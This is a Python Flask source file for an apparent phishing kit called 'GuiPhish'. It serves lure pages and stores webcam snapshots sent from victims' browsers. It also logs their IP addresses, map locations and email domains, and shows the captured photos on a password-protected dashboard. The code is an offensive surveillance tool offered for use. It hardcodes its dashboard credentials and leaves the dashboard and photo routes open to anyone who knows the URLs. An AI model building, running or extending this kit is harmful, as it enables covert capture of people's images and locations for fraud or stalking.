import os
import json
import shutil
import random
import base64
from datetime import datetime
from flask import Flask, request, jsonify, send_file, redirect
from flask_cors import CORS

# 🔐 CONFIG
DASHBOARD_USER = "admin"
DASHBOARD_PASS = "guiphish"

app = Flask(__name__)
CORS(app)

PASTAS = ["logs", "fotos", "relatorios"]
for pasta in PASTAS:
    os.makedirs(pasta, exist_ok=True)

# ================= LOG =================

def ler_eventos():
    caminho = "logs/eventos.jsonl"
    if not os.path.exists(caminho):
        return []

    eventos = []
    with open(caminho, "r", encoding="utf-8") as f:
        for linha in f:
            try:
                eventos.append(json.loads(linha))
            except:
                pass
    return eventos

# ================= ROTAS =================

@app.route("/")
def index():
    return send_file("index.html")

@app.route("/email")
def email():
    return send_file("email.html")

@app.route("/foto/<nome>")
def foto(nome):
    return send_file(f"fotos/{nome}")

# ================= LOGIN =================

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        user = request.form.get("user")
        senha = request.form.get("pass")

        if user == DASHBOARD_USER and senha == DASHBOARD_PASS:
            return redirect("/dashboard")
        else:
            return "<h3 style='color:red'>Login inválido</h3>"

    return """
    <html>
    <body style="background:black;color:#00ff00;font-family:monospace;text-align:center;margin-top:100px">
        <h1>🔐 GuiPhish Login</h1>
        <form method="POST">
            <input name="user" placeholder="user"><br><br>
            <input name="pass" type="password" placeholder="senha"><br><br>
            <button>Entrar</button>
        </form>
    </body>
    </html>
    """

# ================= DASHBOARD =================

@app.route("/dashboard")
def dashboard():
    eventos = ler_eventos()

    fotos = [f for f in os.listdir("fotos") if f.endswith(".jpg")]

    total_camera = len([e for e in eventos if e.get("tipo") == "camera"])
    total_loc = len([e for e in eventos if e.get("tipo") == "localizacao"])
    total_email = len([e for e in eventos if e.get("tipo") == "email"])

    return f"""
    <html>
    <head>
        <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    </head>

    <body style="background:#0f172a;color:white;font-family:Arial;padding:20px">

    <h1>📊 GuiPhish Dashboard</h1>

    <button onclick="location.reload()">🔄 Atualizar</button>
    <button onclick="window.location='/login'">🔓 Logout</button>

    <h2>📈 Estatísticas</h2>

    <canvas id="grafico" width="400"></canvas>

    <script>
    const ctx = document.getElementById('grafico');

    new Chart(ctx, {{
        type: 'bar',
        data: {{
            labels: ['Camera','Localização','Email'],
            datasets: [{{
                label: 'Eventos',
                data: [{total_camera},{total_loc},{total_email}],
            }}]
        }}
    }});
    </script>

    <h2>📸 Fotos</h2>
    {"".join([f'<img src="/foto/{f}" width="200">' for f in fotos])}

    <h2>📋 Eventos</h2>
    {"".join([f"<p>{e.get('tipo')} | {e.get('status')} | {e.get('ip')}</p>" for e in eventos[-20:]])}

    </body>
    </html>
    """

# ================= EVENTO =================

@app.route("/evento", methods=["POST"])
def evento():
    data = request.json or {}

    evento = {
        "timestamp": str(datetime.now()),
        "ip": request.remote_addr,
        "tipo": data.get("tipo"),
        "status": data.get("status"),
        "google_maps": data.get("google_maps", "N/A"),
        "email_domain": data.get("email_domain", "N/A")
    }

    with open("logs/eventos.jsonl", "a", encoding="utf-8") as f:
        f.write(json.dumps(evento) + "\n")

    print("[+] EVENTO:", evento)

    return jsonify({"ok": True})

# ================= CAPTURE =================

@app.route("/capture", methods=["POST"])
def capture():
    data = request.json

    img = data.get("image").split(",")[1]
    img_bytes = base64.b64decode(img)

    nome = f"fotos/{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"

    with open(nome, "wb") as f:
        f.write(img_bytes)

    print("[+] FOTO SALVA:", nome)

    return jsonify({"ok": True})

# ================= MAIN =================

if __name__ == "__main__":
    print("\n🔥 GuiPhish iniciado 🔥\n")
    app.run(host="0.0.0.0", port=10000)
